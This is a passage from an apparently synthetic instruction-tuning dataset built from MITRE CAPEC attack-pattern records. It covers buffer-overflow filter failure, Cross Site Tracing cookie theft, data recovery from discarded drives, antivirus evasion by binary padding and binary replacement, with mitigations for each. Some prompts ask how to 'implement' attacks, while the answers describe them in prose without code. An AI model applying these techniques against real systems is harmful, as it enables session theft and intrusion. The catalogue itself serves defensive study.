                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Ensure that application handles situations where access to APIs in external libraries is not available securely. If the application cannot continue its execution safely it should fail in a consistent and secure fashion."
        },
        "Example_Instances": {
          "Example": "A web-based system uses a third party cryptographic random number generation library that derives entropy from machine's hardware. This library is used in generation of user session ids used by the application. If the library is inaccessible, the application instead uses a software based weak pseudo random number generation library. An attacker of the system blocks access of the application to the third party cryptographic random number generation library (by renaming it). The application in turn uses the weak pseudo random number generation library to generate session ids that are predictable. An attacker then leverages this weakness to guess a session id of another user to perform a horizontal elevation of privilege escalation and gain access to another user's account."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "589"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Filter Failure through Buffer Overflow (CAPEC ID: 24)",
    "context": "",
    "output": "A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.\n* Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.",
        "Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack."
      ],
      "@Name": "Filter Failure through Buffer Overflow (CAPEC ID: 24)",
      "attack_ptrn": {
        "@ID": "24",
        "@Name": "Filter Failure through Buffer Overflow",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "100"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey] The attacker surveys the target application, possibly as a valid and authenticated user",
              "Technique": [
                "Spidering web sites for inputs that involve potential filtering",
                "Brute force guessing of filtered inputs"
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt injections] Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.",
              "Technique": [
                "Brute force attack through black box penetration test tool.",
                "Fuzzing of communications protocols",
                "Manual testing of possible inputs with attack data."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Monitor responses] Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?",
              "Technique": [
                "Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.",
                "Check Log files. An attacker with access to log files can look at the outcome of bad input."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Abuse the system through filter failure] An attacker writes a script to consistently induce the filter failure.",
              "Technique": [
                "DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.",
                "Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.",
                "An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Ability to control the length of data passed to an active filter."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS."
            },
            {
              "@Level": "High",
              "#text": "Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level."
            }
          ]
        },
        "Indicators": {
          "Indicator": "Many exceptions are thrown by the application's filter modules in a short period of time. Check the logs. See if the probes are coming from the same IP address."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.",
            "Pre-design: Use a language or compiler that performs automatic bounds checking.",
            "Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.",
            "Operational: Use OS-level preventative functionality. Not a complete solution.",
            "Design: Use an abstraction library to abstract away risky APIs. Not a complete solution."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": "Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack."
            },
            "A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.",
            "Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "120"
            },
            {
              "@CWE_ID": "119"
            },
            {
              "@CWE_ID": "118"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "680"
            },
            {
              "@CWE_ID": "733"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Cross Site Tracing (CAPEC ID: 107)",
    "context": "",
    "output": "Examples of Cross Site Tracing (CAPEC ID: 107) are: An adversary determines that a particular system is vulnerable to reflected cross-site scripting (XSS) and endeavors to leverage this weakness to steal the victim's authentication cookie. An adversary realizes that since httpOnly attribute is set on the user's cookie, it is not possible to steal it directly with their malicious script. Instead, the adversary has their script use XMLHTTP ActiveX control in the victim's IE browser to issue an HTTP TRACE to the target system's server which has HTTP TRACE enabled. The original HTTP TRACE request contains the session cookie and so does the echoed response. The adversary picks the session cookie from the body of HTTP TRACE response and ships it to the adversary. The adversary then uses the newly acquired victim's session cookie to impersonate the victim in the target system.\nIn the absence of an XSS weakness on the site with which the victim is interacting, an adversary can get the script to come from the site that they control and get it to execute in the victim's browser (if they can trick the victim's into visiting their malicious website or clicking on the link that they supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the adversary's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An adversary will then need to find a way to exploit another weakness that would enable them to circumvent the same origin policy protection.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary determines that a particular system is vulnerable to reflected cross-site scripting (XSS) and endeavors to leverage this weakness to steal the victim's authentication cookie. An adversary realizes that since httpOnly attribute is set on the user's cookie, it is not possible to steal it directly with their malicious script. Instead, the adversary has their script use XMLHTTP ActiveX control in the victim's IE browser to issue an HTTP TRACE to the target system's server which has HTTP TRACE enabled. The original HTTP TRACE request contains the session cookie and so does the echoed response. The adversary picks the session cookie from the body of HTTP TRACE response and ships it to the adversary. The adversary then uses the newly acquired victim's session cookie to impersonate the victim in the target system.",
        "In the absence of an XSS weakness on the site with which the victim is interacting, an adversary can get the script to come from the site that they control and get it to execute in the victim's browser (if they can trick the victim's into visiting their malicious website or clicking on the link that they supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the adversary's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An adversary will then need to find a way to exploit another weakness that would enable them to circumvent the same origin policy protection."
      ],
      "@Name": "Cross Site Tracing (CAPEC ID: 107)",
      "attack_ptrn": {
        "@ID": "107",
        "@Name": "Cross Site Tracing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "Cross Site Tracing (XST) enables an adversary to steal the victim's session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim's browser communicates to a destination system's web server.",
        "Extended_Description": {
          "xhtml:p": "The adversary uses an XSS attack to have victim's browser sent an HTTP TRACE request to a destination web server, which will proceed to return a response to the victim's web browser that contains the original HTTP request in its body. Since the HTTP header of the original HTTP TRACE request had the victim's session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the adversary's malicious site. XST becomes relevant when direct access to the session cookie via the \"document.cookie\" object is disabled with the use of httpOnly attribute which ensures that the cookie can be transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST. If the system with which the victim is interacting is susceptible to XSS, an adversary can exploit that weakness directly to get their malicious script to issue an HTTP TRACE request to the destination system's web server."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "593"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine if HTTP Trace is enabled] Determine if HTTP Trace is enabled at the web server with which the victim has an active session",
              "Technique": "An adversary may issue an HTTP Trace request to the target web server and observe if the response arrives with the original request in the body of the response."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Identify mechanism to launch HTTP Trace request] The adversary attempts to force the victim to issue an HTTP Trace request to the targeted application.",
              "Technique": "The adversary probes for cross-site scripting vulnerabilities to force the victim into issuing an HTTP Trace request."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Create a malicious script that pings the web server with HTTP TRACE request] The adversary creates a malicious script that will induce the victim's browser to issue an HTTP TRACE request to the destination system's web server. The script will further intercept the response from the web server, pick up sensitive information out of it, and forward to the site controlled by the adversary.",
              "Technique": "The adversary's malicious script circumvents the httpOnly cookie attribute that prevents from hijacking the victim's session cookie directly using document.cookie and instead leverages the HTTP TRACE to catch this information from the header of the HTTP request once it is echoed back from the web server in the body of the HTTP TRACE response."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Execute malicious HTTP Trace launching script] The adversary leverages an XSS vulnerability to force the victim to execute the malicious HTTP Trace launching script"
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Intercept HTTP TRACE response] The adversary's script intercepts the HTTP TRACE response from teh web server, glance sensitive information from it, and forward that information to a server controlled by the adversary."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "HTTP TRACE is enabled on the web server",
            "The destination system is susceptible to XSS or an adversary can leverage some other weakness to bypass the same origin policy",
            "Scripting is enabled in the client's browser",
            "HTTP is used as the communication protocol between the server and the client"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Understanding of the HTTP protocol and an ability to craft a malicious script"
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Administrators should disable support for HTTP TRACE at the destination's web server. Vendors should disable TRACE by default.",
            "Patch web browser against known security origin policy bypass exploits."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "An adversary determines that a particular system is vulnerable to reflected cross-site scripting (XSS) and endeavors to leverage this weakness to steal the victim's authentication cookie. An adversary realizes that since httpOnly attribute is set on the user's cookie, it is not possible to steal it directly with their malicious script. Instead, the adversary has their script use XMLHTTP ActiveX control in the victim's IE browser to issue an HTTP TRACE to the target system's server which has HTTP TRACE enabled. The original HTTP TRACE request contains the session cookie and so does the echoed response. The adversary picks the session cookie from the body of HTTP TRACE response and ships it to the adversary. The adversary then uses the newly acquired victim's session cookie to impersonate the victim in the target system.",
              "In the absence of an XSS weakness on the site with which the victim is interacting, an adversary can get the script to come from the site that they control and get it to execute in the victim's browser (if they can trick the victim's into visiting their malicious website or clicking on the link that they supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the adversary's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An adversary will then need to find a way to exploit another weakness that would enable them to circumvent the same origin policy protection."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "693"
            },
            {
              "@CWE_ID": "648"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Cross Site Tracing"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-3"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Retrieve Data from Decommissioned Devices (CAPEC ID: 675)",
    "context": "",
    "output": "Examples of Retrieve Data from Decommissioned Devices (CAPEC ID: 675) are: A company is contracted by an organization to provide data destruction services for solid state and hard disk drives being discarded. Prior to destruction, an adversary within the contracted company copies data from select devices, violating the data confidentiality requirements of the submitting organization.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A company is contracted by an organization to provide data destruction services for solid state and hard disk drives being discarded. Prior to destruction, an adversary within the contracted company copies data from select devices, violating the data confidentiality requirements of the submitting organization.",
      "@Name": "Retrieve Data from Decommissioned Devices (CAPEC ID: 675)",
      "attack_ptrn": {
        "@ID": "675",
        "@Name": "Retrieve Data from Decommissioned Devices",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary obtains decommissioned, recycled, or discarded systems and devices that can include an organization\u2019s intellectual property, employee data, and other types of controlled information. Systems and devices that have reached the end of their lifecycles may be subject to recycle or disposal where they can be exposed to adversarial attempts to retrieve information from internal memory chips and storage devices that are part of the system."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "116"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "37"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "An adversary needs to have access to electronic data processing equipment being recycled or disposed of (e.g., laptops, servers) at a collection location and the ability to take control of it for the purpose of exploiting its content."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "An adversary may need the ability to mount printed circuit boards and target individual chips for exploitation."
            },
            {
              "@Level": "Medium",
              "#text": "An adversary needs the technical skills required to extract solid state drives, hard disk drives, and other storage media to host on a compatible system or harness to gain access to digital content."
            }
          ]
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Accountability",
            "Impact": "Bypass Protection Mechanism"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Backup device data before erasure to retain intellectual property and inside knowledge.",
            "Overwrite data on device rather than deleting. Deleted data can still be recovered, even if the device trash can is emptied. Rewriting data removes any trace of the old data. Performing multiple overwrites followed by a zeroing of the device (overwriting with all zeros) is good practice.",
            "Use a secure erase software.",
            "Physically destroy the device if it is not intended to be reused. Using a specialized service to disintegrate, burn, melt or pulverize the device can be effective, but if those services are inaccessible, drilling nails or holes, or smashing the device with a hammer can be effective. Do not burn, microwave, or pour acid on a hard drive.",
            "Physically destroy memory and SIM cards for mobile devices not intended to be reused.",
            "Ensure that the user account has been terminated or switched to a new device before destroying."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "A company is contracted by an organization to provide data destruction services for solid state and hard disk drives being discarded. Prior to destruction, an adversary within the contracted company copies data from select devices, violating the data confidentiality requirements of the submitting organization."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1266"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1052",
            "Entry_Name": "Exfiltration Over Physical Medium"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-663"
            },
            {
              "@External_Reference_ID": "REF-717"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Mitigations, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Avoid Security Tool Identification by Adding Data (CAPEC ID: 655), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: Adding data to change the checksum of a file and can be used to avoid hash-based denylists and static anti-virus signatures.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Adding data to change the checksum of a file and can be used to avoid hash-based denylists and static anti-virus signatures.",
      "@Name": "Avoid Security Tool Identification by Adding Data (CAPEC ID: 655)",
      "attack_ptrn": {
        "@ID": "655",
        "@Name": "Avoid Security Tool Identification by Adding Data",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": [
            "An adversary adds data to a file to increase the file size beyond what security tools are capable of handling in an attempt to mask their actions.",
            "In addition to this, adding data to a file also changes the file's hash, frustrating security tools that look for known bad files by their hash."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "572"
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Accountability",
              "Impact": [
                "Hide Activities",
                "Bypass Protection Mechanism"
              ]
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "Adding data to change the checksum of a file and can be used to avoid hash-based denylists and static anti-virus signatures."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1027.001",
            "Entry_Name": "Obfuscated Files or Information:Binary padding"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-07-30"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2021-06-24",
            "Modification_Comment": "Updated Example_Instances"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Replace Binaries (CAPEC ID: 642)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: The installer for a previous version of Firefox would use a DLL maliciously placed in the default download directory instead of the existing DLL located elsewhere, probably due to DLL hijacking. This DLL would be run with administrator privileges if the installer has those privileges.\n- By default, the Windows screensaver application SCRNSAVE.exe leverages the scrnsave.scr Portable Executable (PE) file in C:\\Windows\\system32\\. This value is set in the registry at HKEY_CURRENT_USER\\Control Panel\\Desktop, which can be modified by an adversary to instead point to a malicious program. This program would then run any time the SCRNSAVE.exe program is activated and with administrator privileges. An adversary may additionally modify other registry values within the same location to set the SCRNSAVE.exe program to run more frequently.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The installer for a previous version of Firefox would use a DLL maliciously placed in the default download directory instead of the existing DLL located elsewhere, probably due to DLL hijacking. This DLL would be run with administrator privileges if the installer has those privileges.",
        "By default, the Windows screensaver application SCRNSAVE.exe leverages the scrnsave.scr Portable Executable (PE) file in C:\\Windows\\system32\\. This value is set in the registry at HKEY_CURRENT_USER\\Control Panel\\Desktop, which can be modified by an adversary to instead point to a malicious program. This program would then run any time the SCRNSAVE.exe program is activated and with administrator privileges. An adversary may additionally modify other registry values within the same location to set the SCRNSAVE.exe program to run more frequently."
      ],
      "@Name": "Replace Binaries (CAPEC ID: 642)",
      "attack_ptrn": {
        "@ID": "642",
        "@Name": "Replace Binaries",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "Adversaries know that certain binaries will be regularly executed as part of normal processing. If these binaries are not protected with the appropriate file system permissions, it could be possible to replace them with malware. This malware might be executed at higher system permission levels. A variation of this pattern is to discover self-extracting installation packages that unpack binaries to directories with weak file permissions which it does not clean up appropriately. These binaries can be replaced by malware, which can then be executed.",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "17"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The attacker must be able to place the malicious binary on the target machine."
        },
        "Mitigations": {
          "Mitigation": "Insure that binaries commonly used by the system have the correct file permissions. Set operating system policies that restrict privilege elevation of non-Administrators. Use auditing tools to observe changes to system services."
        },
        "Example_Instances": {
          "Example": [
            "The installer for a previous version of Firefox would use a DLL maliciously placed in the default download directory instead of the existing DLL located elsewhere, probably due to DLL hijacking. This DLL would be run with administrator privileges if the installer has those privileges.",
            "By default, the Windows screensaver application SCRNSAVE.exe leverages the scrnsave.scr Portable Executable (PE) file in C:\\Windows\\system32\\. This value is set in the registry at HKEY_CURRENT_USER\\Control Panel\\Desktop, which can be modified by an adversary to instead point to a malicious program. This program would then run any time the SCRNSAVE.exe program is activated and with administrator privileges. An adversary may additionally modify other registry values within the same location to set the SCRNSAVE.exe program to run more frequently."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "732"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1505.005",
              "Entry_Name": "Server Software Component: Terminal Services DLL"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1554",
              "Entry_Name": "Compromise Client Software Binary"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1574.005",
              "Entry_Name": "Hijack Execution Flow:Executable Installer File Permissions Weakness"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Binary planting"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2018-05-31"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Example_Instances, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Local Execution of Code (CAPEC ID: 549)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Local Execution of Code (CAPEC ID: 549) are: BlueBorne refers to a set of nine vulnerabilities on different platforms (Linux, Windows, Android, iOS) that offer an adversary the ability to install and execute malicious code on a system if they were close in proximity to a Bluetooth enabled device. One vulnerability affecting iOS versions 7 through 9 allowed an attacker to overflow the Low Energy Audio Protocol since commands sent over this protocol are improperly validated and gain the elevated permissions of the Bluetooth stack. These vulnerabilities were a result of poor validation and were patched shortly after their exposure in 2017, but many non-updated devices remain vulnerable.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "BlueBorne refers to a set of nine vulnerabilities on different platforms (Linux, Windows, Android, iOS) that offer an adversary the ability to install and execute malicious code on a system if they were close in proximity to a Bluetooth enabled device. One vulnerability affecting iOS versions 7 through 9 allowed an attacker to overflow the Low Energy Audio Protocol since commands sent over this protocol are improperly validated and gain the elevated permissions of the Bluetooth stack. These vulnerabilities were a result of poor validation and were patched shortly after their exposure in 2017, but many non-updated devices remain vulnerable.",
      "@Name": "Local Execution of Code (CAPEC ID: 549)",
      "attack_ptrn": {
        "@ID": "549",
        "@Name": "Local Execution of Code",
        "@Abstraction": "Meta",
        "@Status": "Stable",
